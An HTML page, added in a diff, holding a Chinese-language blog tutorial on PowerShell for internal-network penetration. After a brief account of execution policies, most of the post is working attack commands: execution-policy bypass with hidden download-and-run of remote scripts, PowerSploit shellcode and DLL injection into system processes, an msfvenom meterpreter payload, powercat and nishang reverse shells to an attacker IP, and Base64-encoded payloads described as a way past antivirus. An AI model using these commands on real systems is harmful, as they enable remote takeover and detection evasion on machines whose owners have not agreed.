@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="PowershellPowershell基本概念Windows PowerShell是一种命令行外壳程序和脚本环境，可以看作是命令行提示符cmd.exe的扩展，其使命令行用户和脚本编写者可以利用.NET Framework的强大功能。只要可以在一台计算机上运行代码，就可以将PowerShell脚本文件（.ps1）下载到磁盘中执行（甚至无须将脚本文件写到磁盘中）。 Powershell特点 在Win">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网学习--Powershell使用">
+<meta property="og:url" content="http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/index.html">
+<meta property="og:site_name" content="steady&#39;s blog">
+<meta property="og:description" content="PowershellPowershell基本概念Windows PowerShell是一种命令行外壳程序和脚本环境，可以看作是命令行提示符cmd.exe的扩展，其使命令行用户和脚本编写者可以利用.NET Framework的强大功能。只要可以在一台计算机上运行代码，就可以将PowerShell脚本文件（.ps1）下载到磁盘中执行（甚至无须将脚本文件写到磁盘中）。 Powershell特点 在Win">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-11-20T20:14:26.000Z">
+<meta property="article:modified_time" content="2020-11-21T08:14:57.442Z">
+<meta property="article:author" content="steady">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>内网学习--Powershell使用</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="steady's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/11/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--Wireshark%E4%BD%BF%E7%94%A8/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&text=内网学习--Powershell使用"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&title=内网学习--Powershell使用"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&is_video=false&description=内网学习--Powershell使用"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网学习--Powershell使用&body=Check out this article: http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&title=内网学习--Powershell使用"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&title=内网学习--Powershell使用"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&title=内网学习--Powershell使用"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&title=内网学习--Powershell使用"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&name=内网学习--Powershell使用&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://s1eady.top/2020/11/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Powershell/&t=内网学习--Powershell使用"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell"><span class="toc-number">1.</span> <span class="toc-text">Powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">Powershell基本概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell%E7%89%B9%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">Powershell特点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5"><span class="toc-number">1.3.</span> <span class="toc-text">Powershell执行策略</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E5%80%BC"><span class="toc-number">1.3.1.</span> <span class="toc-text">常见的执行策略值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">绕过执行策略</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Bypass%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E5%B9%B6%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">Bypass本地权限并执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerSploit"><span class="toc-number">1.4.</span> <span class="toc-text">PowerSploit</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PowerSploit%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.4.1.</span> <span class="toc-text">PowerSploit基本概念</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PowerSploit%E7%89%B9%E7%82%B9"><span class="toc-number">1.4.2.</span> <span class="toc-text">PowerSploit特点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PowerSploit%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.4.3.</span> <span class="toc-text">PowerSploit下载</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PowerSploit%E6%A8%A1%E5%9D%97"><span class="toc-number">1.4.4.</span> <span class="toc-text">PowerSploit模块</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#powershell%E5%8F%8D%E5%BC%B9shell%E5%B8%B8%E8%A7%81%E6%96%B9%E5%BC%8F"><span class="toc-number">1.5.</span> <span class="toc-text">powershell反弹shell常见方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Base64%E5%AF%B9PowerShell%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81"><span class="toc-number">1.6.</span> <span class="toc-text">使用Base64对PowerShell命令进行编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.7.</span> <span class="toc-text"></span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        内网学习--Powershell使用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">steady</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-11-20T20:14:26.000Z" itemprop="datePublished">2020-11-21</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><h4 id="Powershell基本概念"><a href="#Powershell基本概念" class="headerlink" title="Powershell基本概念"></a>Powershell基本概念</h4><p>Windows PowerShell是一种命令行外壳程序和脚本环境，可以看作是命令行提示符cmd.exe的扩展，其使命令行用户和脚本编写者可以利用.NET Framework的强大功能。只要可以在一台计算机上运行代码，就可以将PowerShell脚本文件（.ps1）下载到磁盘中执行（甚至无须将脚本文件写到磁盘中）。</p>
+<h4 id="Powershell特点"><a href="#Powershell特点" class="headerlink" title="Powershell特点"></a>Powershell特点</h4><ul>
+<li>在Windows 7以上版本是默认安装的；</li>
+<li>脚本可以在内存中运行，不需要写入磁盘；</li>
+<li>几乎不会触发杀毒软件；</li>
+<li>可远程执行；</li>
+<li>目前很多工具都是局域PowerShell开发的；</li>
+<li>使Windows脚本的执行更为容易；</li>
+<li>cmd.exe的运行通常会被阻止，但PowerShell的运行通常不会被阻止；</li>
+<li>可用于管理活动目录；</li>
+</ul>
+<h4 id="Powershell执行策略"><a href="#Powershell执行策略" class="headerlink" title="Powershell执行策略"></a>Powershell执行策略</h4><p>为了防止使用者运行恶意脚本，PowerShell提供了一个执行策略。在默认情况下，这个执行策略被设置为“不能运行”。</p>
+<p>使用如下的cmdlet命令查询当前的执行策略：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure>
+
+<h5 id="常见的执行策略值"><a href="#常见的执行策略值" class="headerlink" title="常见的执行策略值"></a>常见的执行策略值</h5><ul>
+<li>Restricted：脚本不能运行（默认设置）；</li>
+<li>RemoteSigned：在本地创建的脚本可以运行，但不能运行网上下载的脚本（拥有数字证书的除外）；</li>
+<li>AllSigned：仅当脚本由受信任的发布者签名时才能运行；</li>
+<li>Unrestricted：允许所有脚本运行；</li>
+</ul>
+<p>使用下面的cmdlet命令设置PowerShell的执行策略：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; Set-ExecutionPolicy &lt;policy name&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="绕过执行策略"><a href="#绕过执行策略" class="headerlink" title="绕过执行策略"></a>绕过执行策略</h5><p>PowerSploit是一款基于PowerShell的后渗透测试框架，其中包含很多PowerShell脚本，主要用于渗透测试中的信息收集、权限提升、权限维持。</p>
+<p>想运行PowerShell脚本，必须使用管理员权限将执行策略从Restricted改为Unrestricted。</p>
+<h6 id="Bypass本地权限并执行"><a href="#Bypass本地权限并执行" class="headerlink" title="Bypass本地权限并执行"></a>Bypass本地权限并执行</h6><ul>
+<li><p>将PowerShell脚本文件test.ps1上传至目标服务器。在命令行环境下，执行如下命令，绕过安全策略，在目标服务器本地执行该脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File test.ps1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用iex下载远程PS1脚本绕过权限执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString(&quot;xxx.ps1&quot;);[Parameters]</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h4><h5 id="PowerSploit基本概念"><a href="#PowerSploit基本概念" class="headerlink" title="PowerSploit基本概念"></a>PowerSploit基本概念</h5><p>PowerSploit是GitHub上面的一个安全项目，上面有很多powershell攻击脚本，它们主要被用来渗透中的信息侦察、权限提升、权限维持。</p>
+<h5 id="PowerSploit特点"><a href="#PowerSploit特点" class="headerlink" title="PowerSploit特点"></a>PowerSploit特点</h5><p>1.代码运行在内存中可以不去接触磁盘</p>
+<p>2.从另一个系统中下载代码并执行</p>
+<p>3.很多安全产品并不能监测到powershell的活动</p>
+<p>4.cmd.exe通常被阻止运行，但是powershell不会</p>
+<h5 id="PowerSploit下载"><a href="#PowerSploit下载" class="headerlink" title="PowerSploit下载"></a>PowerSploit下载</h5><p>Github下载之后，我们放到攻击机的web目录，以便于在目标机器的powershell中下载对应的利用脚本。</p>
+<h5 id="PowerSploit模块"><a href="#PowerSploit模块" class="headerlink" title="PowerSploit模块"></a>PowerSploit模块</h5><ul>
+<li><p>CodeExecution模块–Invoke-Shellcode脚本</p>
+<p>   直接执行shellcode反弹meterpreter shell</p>
+<ul>
+<li><p>利用msfvenom生成一个反弹木马，以供invoke-shellcode注入。</p>
+</li>
+<li><p>调用目标机的powershell进行IEX远程下载invoke-shellcode脚本和生成的木马。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSp</span><br><span class="line">loit&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1&quot;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>下载生成好的木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;code&quot;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>kali设置msf监听</p>
+</li>
+<li><p>在powershell中调用invoke-shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; Invoke-Shellcode -Shellcode $buf -Force</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>指定进程注入shellcode反弹meterpreter shell</p>
+<ul>
+<li><p>下载ps脚本和木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSp</span><br><span class="line">loit&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1&quot;)</span><br><span class="line">PS C:\Users\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;code&quot;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>选择注入的进程—直接选择系统进程，因为如果我们的进程关闭，我们的会话也会关闭，系统进程一般不回被关闭。<br>常见系统进程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explorer进程(Windows程序管理器或者文件资源管理器)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Get-Process或者ps命令查看当前所有的进程。</p>
+<p><code>ps -Name explorer</code>查看某一个进程的PID。</p>
+</li>
+<li><p>注入id为1228的进程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Shellcode -Shellcode $buf -ProcessID 1228 -Force调用invoke-dllinjection将DLL注入到进程中。</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>CodeExecution模块–调用invoke-dllinjection将DLL注入到进程中</p>
+<ul>
+<li><p>msf生成dll文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.190.141 lport&#x3D;4444 -f dll -o &#x2F;var&#x2F;www&#x2F;html&#x2F;code.dll</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Powershel 下载dllinjection文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; IEX(New-Object Net.Webclient).DownloadString(&quot;http:&#x2F;&#x2F;192.168.190.141&#x2F;PowerSploit&#x2F;CodeExecutio</span><br><span class="line">n&#x2F;Invoke-DllInjection.ps1&quot;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将dll注入到某一个进程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; Invoke-DllInjection -Dll .\code.dll -ProcessID 2700</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="powershell反弹shell常见方式"><a href="#powershell反弹shell常见方式" class="headerlink" title="powershell反弹shell常见方式"></a>powershell反弹shell常见方式</h4><ul>
+<li><p>powercat反弹shell </p>
+<p>powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat 。</p>
+<ul>
+<li><p>下载脚本文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString (&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 192.168.159.134 -p 6666 -e cmd</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>nishang反弹shell </p>
+<p>Nishang是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</p>
+<ul>
+<li><p>反弹TCPshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com &#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>自定义powershell函数反弹shell </p>
+</li>
+<li><p>反弹UDPshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.134&#x2F;nishang&#x2F;Shells&#x2F;Invoke-PowerShellUdp.ps1&#39;); Invoke-PowerShellUdp -Reverse -IPAddress 192.168.159.134 -port 53</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="使用Base64对PowerShell命令进行编码"><a href="#使用Base64对PowerShell命令进行编码" class="headerlink" title="使用Base64对PowerShell命令进行编码"></a>使用Base64对PowerShell命令进行编码</h4><p>使用Base64编码PowerShell命令可以起到混淆和压缩代码的作用，避免一些特殊字符导致脚本被杀毒软件所查杀。</p>
+<p>使用一个Python脚本文件<a target="_blank" rel="noopener" href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py">ps_encoder.py</a>，其使用Base64编码封装的PowerShell命令包，其目的是混淆和压缩代码。</p>
+<ul>
+<li><p>将payload输入到文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# echo &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;cheetz&#x2F;PowerSploit&#x2F;master&#x2F;CodeExecution&#x2F;Invoke--Shellcode.ps1&#39;); Invoke-Shellcode -Payload windows&#x2F;meterpreter&#x2F;reverse_https -Lhost 192.168.10.137 -Lport 666 -Force&quot; &gt;raw.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用脚本对其编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# python ps_encoder.py -s raw.txt</span><br><span class="line">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop#</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在目标机器上执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -NoP -NonI -Exec Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4></li>
+</ul>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell"><span class="toc-number">1.</span> <span class="toc-text">Powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">Powershell基本概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell%E7%89%B9%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">Powershell特点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5"><span class="toc-number">1.3.</span> <span class="toc-text">Powershell执行策略</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E5%80%BC"><span class="toc-number">1.3.1.</span> <span class="toc-text">常见的执行策略值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">绕过执行策略</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Bypass%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E5%B9%B6%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">Bypass本地权限并执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerSploit"><span class="toc-number">1.4.</span> <span class="toc-text">PowerSploit</span></a><ol class="toc-child"><li class="toc-item 